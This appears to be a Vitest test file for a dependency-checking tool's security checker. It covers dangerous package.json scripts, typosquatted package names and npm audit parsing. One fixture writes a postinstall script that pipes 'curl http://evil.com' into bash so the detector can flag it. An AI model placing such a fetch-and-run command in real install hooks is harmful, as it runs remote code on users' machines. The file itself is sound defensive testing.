import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import * as fs from 'node:fs';
import * as path from 'node:path';
import * as os from 'node:os';

// vi.mock is hoisted — this replaces the built-in module so execSync is configurable
vi.mock('node:child_process', () => ({
  execSync: vi.fn(),
}));

// Import AFTER vi.mock so the module sees the mocked version
import { execSync } from 'node:child_process';
import { checkSecurity } from '../../../src/checks/security/security-checker.js';

const mockedExecSync = vi.mocked(execSync);

let tmpDir: string;

beforeEach(() => {
  tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'depdoctor-security-'));
  vi.clearAllMocks();
});

afterEach(() => {
  fs.rmSync(tmpDir, { recursive: true, force: true });
});

const securityConfig = {
  ignoreDependencies: [],
  ignoreVariables: [],
  ignoreFiles: [],
  ignorePackages: [],
  security: true,
  fix: false,
  maxFileSizeMB: 10,
  maxFiles: 10000,
  maxDepth: 20,
  includeDevDependencies: true,
  reportFormat: 'terminal' as const,
};

function mockCleanAudit() {
  mockedExecSync.mockReturnValue(
    Buffer.from(JSON.stringify({
      vulnerabilities: {},
      metadata: { vulnerabilities: { info: 0, low: 0, moderate: 0, high: 0, critical: 0, total: 0 } },
    })),
  );
}

function mockAuditWithError(auditJson: object) {
  // npm audit exits non-zero when vulnerabilities found — execSync throws
  mockedExecSync.mockImplementation(() => {
    throw Object.assign(new Error('audit found issues'), {
      stdout: JSON.stringify(auditJson),
    });
  });
}

// ─── Dangerous scripts ────────────────────────────────────────────────────────

describe('checkSecurity — dangerous scripts', () => {
  it('flags curl pipe bash in postinstall', async () => {
    fs.writeFileSync(
      path.join(tmpDir, 'package.json'),
      JSON.stringify({
        name: 'test',
        scripts: { postinstall: 'curl http://evil.com | bash' },
      }),
    );
    mockCleanAudit();
    const issues = await checkSecurity(tmpDir, securityConfig);
    expect(issues.some((i) => i.type === 'dangerous-script')).toBe(true);
  });

  it('does not flag safe scripts', async () => {
    fs.writeFileSync(
      path.join(tmpDir, 'package.json'),
      JSON.stringify({
        name: 'test',
        scripts: { build: 'tsc', test: 'vitest run' },
      }),
    );
    mockCleanAudit();
    const issues = await checkSecurity(tmpDir, securityConfig);
    expect(issues.filter((i) => i.type === 'dangerous-script')).toHaveLength(0);
  });

  it('skips all checks when security:false in config', async () => {
    const cfg = { ...securityConfig, security: false };
    const issues = await checkSecurity(tmpDir, cfg);
    expect(issues).toHaveLength(0);
    expect(mockedExecSync).not.toHaveBeenCalled();
  });
});

// ─── Typosquatting ─────────────────────────────────────────────────────────────

describe('checkSecurity — typosquatting', () => {
  it('flags known typosquat packages', async () => {
    fs.writeFileSync(
      path.join(tmpDir, 'package.json'),
      JSON.stringify({
        name: 'test',
        dependencies: { lodas: '^4.0.0' },
      }),
    );
    mockCleanAudit();
    const issues = await checkSecurity(tmpDir, securityConfig);
    expect(issues.some((i) => i.type === 'typosquat' && i.package === 'lodas')).toBe(true);
  });

  it('does not flag legitimate packages', async () => {
    fs.writeFileSync(
      path.join(tmpDir, 'package.json'),
      JSON.stringify({ name: 'test', dependencies: { lodash: '^4.0.0' } }),
    );
    mockCleanAudit();
    const issues = await checkSecurity(tmpDir, securityConfig);
    expect(issues.some((i) => i.type === 'typosquat' && i.package === 'lodash')).toBe(false);
  });
});

// ─── npm audit integration ────────────────────────────────────────────────────

describe('checkSecurity — npm audit integration', () => {
  it('parses npm audit vulnerabilities', async () => {
    fs.writeFileSync(path.join(tmpDir, 'package.json'), JSON.stringify({ name: 'test' }));
    mockAuditWithError({
      vulnerabilities: {
        'vulnerable-pkg': {
          name: 'vulnerable-pkg',
          severity: 'high',
          isDirect: true,
          via: ['vulnerable-pkg'],
          fixAvailable: true,
        },
      },
      metadata: {
        vulnerabilities: { info: 0, low: 0, moderate: 0, high: 1, critical: 0, total: 1 },
      },
    });
    const issues = await checkSecurity(tmpDir, securityConfig);
    const vuln = issues.find((i) => i.type === 'vulnerability' && i.package === 'vulnerable-pkg');
    expect(vuln).toBeDefined();
    expect(vuln?.severity).toBe('high');
  });

  it('handles npm audit clean output (no vulnerabilities)', async () => {
    fs.writeFileSync(path.join(tmpDir, 'package.json'), JSON.stringify({ name: 'test' }));
    mockCleanAudit();
    const issues = await checkSecurity(tmpDir, securityConfig);
    expect(issues.filter((i) => i.type === 'vulnerability')).toHaveLength(0);
  });

  it('does not crash when npm audit is unavailable', async () => {
    fs.writeFileSync(path.join(tmpDir, 'package.json'), JSON.stringify({ name: 'test' }));
    mockedExecSync.mockImplementation(() => {
      throw new Error('npm not found');
    });
    await expect(checkSecurity(tmpDir, securityConfig)).resolves.toBeDefined();
  });
});
